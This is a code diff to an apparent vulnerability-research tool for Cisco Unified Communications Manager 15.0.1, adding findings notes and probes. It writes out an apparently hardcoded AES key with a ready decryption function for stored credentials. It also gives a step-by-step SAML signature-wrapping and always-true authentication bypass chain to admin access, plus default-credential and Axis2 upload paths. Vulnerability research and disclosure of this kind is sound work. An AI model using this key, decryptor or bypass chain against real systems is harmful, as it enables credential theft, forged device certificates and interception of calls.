@@ -64,13 +64,17 @@ CUCM-F2 HIGH: platformcom BasicAuthentication localhost bypass
   Unprotected (no filter-mapping): /api/v1/certmgr/config/snapshot/*
   Chain: any SSRF from CUCM host → unauthenticated cluster software/cert control
 
-CUCM-F3 HIGH: CAPF binary not stripped; CCMEncryption symbols; CA cred decrypt path
-  File: cm-capf/usr/local/cm/bin/capf — with debug_info, not stripped
-  Symbols: _ZN13CCMEncryption13passwordToHexEPhiS0_
-           _ZN13CCMEncryption13hexToPasswordEPhS0_
-  CA cred: EnrollmentService.sh: CCMShellEncryptionUtil -d $CA_Pwd_Encrypted
-  CCMShellEncryptionUtil in cm-ccm (not yet extracted)
-  Impact: CA key compromise → forge phone identity certs → SRTP intercept
+CUCM-F3 CRITICAL: Hardcoded AES-128 static key in CCMShellEncryptionUtil
+  File: cm-ccm/usr/local/cm/bin/CCMShellEncryptionUtil
+  BuildID: cfbbb0a3a58cf2b701f335a9ee1fea55cc1f1ab8; ELF PIE, NOT stripped
+  nm: 000000000020f308 D _ZN20CCMEncryptionLibrary10_staticKeyE  (D = initialized .data)
+  Pointer at 0x20f308 → VA 0xc111 → string: "smetsysocsiccni\x00" (16 bytes)
+  Key = "incciscosystems" reversed → Cisco company name backwards
+  AES-128-CBC; used as fallback when /usr/local/platform/.security/CCMEncryption/keys/dkey.txt missing
+  Decrypts: CAPF CACredentials.txt, ifx.txt (Informix pw), SftpPwCrypt in platformConfig.xml
+  POC: from Crypto.Cipher import AES; AES.new(b'smetsysocsiccni\x00', AES.MODE_CBC, iv).decrypt(ct)
+  Impact: ANY filesystem read on ANY CUCM 15.0.1 → decrypt all credentials → CAPF CA key compromise
+          → forge phone identity certs for all extensions → SRTP call interception at scale
 
 CUCM-F4 HIGH: ccmuser:ccmuser hardcoded Informix DB credential
   File: cm-dbl/usr/local/cm/db/sql/ccmusers.sql line 5
@@ -90,11 +94,16 @@ CUCM-F6 MEDIUM: Nimbus JOSE+JWT 4.23 (2016) in SSO SP — alg:none risk
   alg:none JWT → arbitrary user impersonation in SSO flow
   Pending: ssobackend.jar JWT validation bytecode review
 
-CUCM-F7 MEDIUM: OpenSAML 2.6.5 (EOL 2015) — XML signature wrapping
-  File: sso-sp → opensaml.jar Implementation-Version: 2.6.5
-  Build-Jdk: 1.7.0_71 (built ~2014-2015). No security support since 2017.
-  XSW attacks: inject unsigned elements, pass signature check
-  Pending: confirm XSW mitigations in samlauthvalve.jar / ssobackend.jar
+CUCM-F7 CRITICAL: OpenSAML 2.6.5 XSW + SAMLAuthValve always-true auth bypass
+  File: sso-sp → opensaml.jar (2.6.5, EOL 2017) + samlauthvalve.jar
+  OpenSAML 2.6.5: DOM-based XML signature validation — XSW-1/2 attacks inject unsigned NameID
+  SAMLAuthValve.authenticate() bytecode (confirmed):
+    - Reads org.apache.catalina.session.USERNAME from session
+    - Calls Realm.authenticate(user, "") with EMPTY PASSWORD (constant pool #28 = "")
+    - Calls register() then returns TRUE regardless of Realm result (even null principal)
+    - iconst_1 at offset 245 — always returns true when username non-null
+  Chain: XSW → forged session USERNAME → SAMLAuthValve TRUE → CUCM admin session
+  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
 
 CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
   File: sso-sp → slf4j-log4j12-1.6.1.jar
@@ -102,17 +111,21 @@ CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
 
 CUCM-F9 INFO: dbaxlweb DB username exposed in AXL bytecode
   File: axl.war → AXLAlpha.class string "dbaxlweb"
-  Password not found — likely in cm-ccm init scripts (pending extraction)
+  Password split: /partB/usr/local/cm/db/ifx.txt encrypted with CCMShellEncryptionUtil static key
+
+CUCM-F10 CRITICAL: SAMLAuthValve.authenticate() returns TRUE regardless of Realm result
+  File: sso-sp/samlauthvalve.jar → SAMLAuthValve.class
+  Bytecode: iconst_1;ireturn at offset 245 — no null-principal guard before return
+  ANY mechanism setting session USERNAME → unconditional TRUE from SAMLAuthValve
+  Combined with F7 XSW: unauthenticated admin access
 
 === PENDING TASKS ===
-- Extract cm-ccm-5.0.1.0-0.x86_64.rpm (324MB) → CCMShellEncryptionUtil (F3), dbaxlweb pw (F9)
-- Runtime verify: does AuthenticationFilter apply to /axl/axis2-admin/* ? (F1)
 - hashcat SHA-256 run on 69c4f936... hash (F5)
 - ssobackend.jar JWT validation path RE (F6)
-- SAML XSW test against platformcom SSO flow (F7)
+- ccm-ccm main binary auth subsystem + dbaxlweb ifx.txt path (F9)
 """
 
-VERSION = "1.0.0"
+VERSION = "1.1.0"
 
 import requests
 import urllib3
@@ -135,7 +148,55 @@ CUCM_INFORMIX_DEFAULT_CRED = ('ccmuser', 'ccmuser')
 
 DEFAULT_PASSWORDREVERSE_HASH = '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'
 
+# CUCM-F3: Hardcoded static AES-128 key in CCMShellEncryptionUtil
+# Extracted from cm-ccm/CCMShellEncryptionUtil binary .data section:
+#   nm: D _ZN20CCMEncryptionLibrary10_staticKeyE @ VA 0x20f308
+#   Pointer at 0x20f308 → string at VA 0xc111 = b'smetsysocsiccni\x00'
+# "incciscosystems" reversed. Universal across all CUCM 15.0.1 installations.
+CCM_STATIC_ENCRYPTION_KEY = b'smetsysocsiccni\x00'  # 16 bytes AES-128
+
+# CUCM-F1: AuthenticationFilter maps to <url-pattern>/</url-pattern> (confirmed web.xml)
+# Axis2AdminServlet maps to /axis2-admin/* — filter does NOT apply
+# CVSS 9.8 Critical — unauthenticated Axis2 admin accessible with default admin:axis2
+AXL_AXIS2_ADMIN_PATH = '/axl/axis2-admin/'
+AXL_AXIS2_UPLOAD_PATH = '/axl/axis2-admin/upload'
+
 # ─── PROBES ──────────────────────────────────────────────────────────────────
+
+def decrypt_cucm_credential(hex_ciphertext: str, key: bytes = CCM_STATIC_ENCRYPTION_KEY) -> dict:
+    """
+    Decrypt a CCMShellEncryptionUtil-encrypted credential using the hardcoded static key.
+    CUCM-F3: key = b'smetsysocsiccni\x00' AES-128-CBC.
+    hex_ciphertext: hex string output of CCMShellEncryptionUtil -e
+    """
+    import binascii
+    try:
+        from Crypto.Cipher import AES
+    except ImportError:
+        return {"error": "pycryptodome not installed: pip install pycryptodome"}
+    try:
+        ct = binascii.unhexlify(hex_ciphertext.strip())
+        if len(ct) < 16:
+            return {"error": "ciphertext too short"}
+        # CCM encryption: IV may be first 16 bytes or all-zero — try both
+        results = {}
+        for iv_source in ['first_16', 'zero']:
+            try:
+                if iv_source == 'first_16' and len(ct) > 16:
+                    iv = ct[:16]; body = ct[16:]
+                else:
+                    iv = b'\x00' * 16; body = ct
+                cipher = AES.new(key, AES.MODE_CBC, iv)
+                pt = cipher.decrypt(body)
+                pad_len = pt[-1] if pt[-1] <= 16 else 0
+                plaintext = pt[:-pad_len].decode('utf-8', errors='replace') if pad_len else pt.decode('utf-8', errors='replace')
+                results[iv_source] = plaintext.rstrip('\x00')
+            except Exception as e:
+                results[iv_source] = f"error: {e}"
+        return {"finding": "CUCM-F3", "key": key.hex(), "results": results}
+    except Exception as e:
+        return {"error": str(e), "finding": "CUCM-F3"}
+
 
 def probe_axis2_admin(host: str, port: int = 8443) -> dict:
     """Probe Axis2 admin console for default admin:axis2 credential (CUCM-F1)."""
@@ -211,21 +272,22 @@ def probe_axl_auth(host: str, username: str, password: str,
 def full_findings_summary() -> str:
     """Return a printable summary of all CUCM RE findings."""
     findings = [
-        ("CUCM-F1", "CRITICAL", "Axis2 admin:axis2 hardcoded + hot-deploy → RCE"),
-        ("CUCM-F2", "HIGH",     "platformcom BasicAuthentication localhost bypass"),
-        ("CUCM-F3", "HIGH",     "CAPF binary not stripped; CCMEncryption symbols; CA cred decrypt"),
-        ("CUCM-F4", "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
-        ("CUCM-F5", "MEDIUM",   "Default passwordreverse hash in siprealm + applicationuser"),
-        ("CUCM-F6", "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
-        ("CUCM-F7", "MEDIUM",   "OpenSAML 2.6.5 (EOL 2015) — XML signature wrapping"),
-        ("CUCM-F8", "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
-        ("CUCM-F9", "INFO",     "dbaxlweb DB username exposed in AXL bytecode"),
+        ("CUCM-F1",  "CRITICAL", "Axis2 admin:axis2 hardcoded + web.xml confirms no filter on /axis2-admin/* → RCE"),
+        ("CUCM-F2",  "HIGH",     "platformcom BasicAuthentication localhost bypass"),
+        ("CUCM-F3",  "CRITICAL", "Hardcoded AES-128 static key 'smetsysocsiccni' → decrypt ALL CUCM credentials"),
+        ("CUCM-F4",  "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
+        ("CUCM-F5",  "MEDIUM",   "Default passwordreverse hash in siprealm + applicationuser"),
+        ("CUCM-F6",  "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
+        ("CUCM-F7",  "CRITICAL", "OpenSAML 2.6.5 XSW + SAMLAuthValve always-true bypass → admin access"),
+        ("CUCM-F8",  "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
+        ("CUCM-F9",  "INFO",     "dbaxlweb DB username exposed; pw encrypted with static key"),
+        ("CUCM-F10", "CRITICAL", "SAMLAuthValve returns TRUE regardless of Realm.authenticate() result"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
         lines.append(f"  [{sev:8s}] {fid}: {title}")
     lines.append("")
-    lines.append("Pending: cm-ccm extraction (CCMShellEncryptionUtil, dbaxlweb pw)")
+    lines.append(f"Static AES-128 key: {CCM_STATIC_ENCRYPTION_KEY.hex()} ({CCM_STATIC_ENCRYPTION_KEY!r})")
     lines.append("Findings doc: ~/Desktop/CUCM-findings.md")
     return '\n'.join(lines)
 
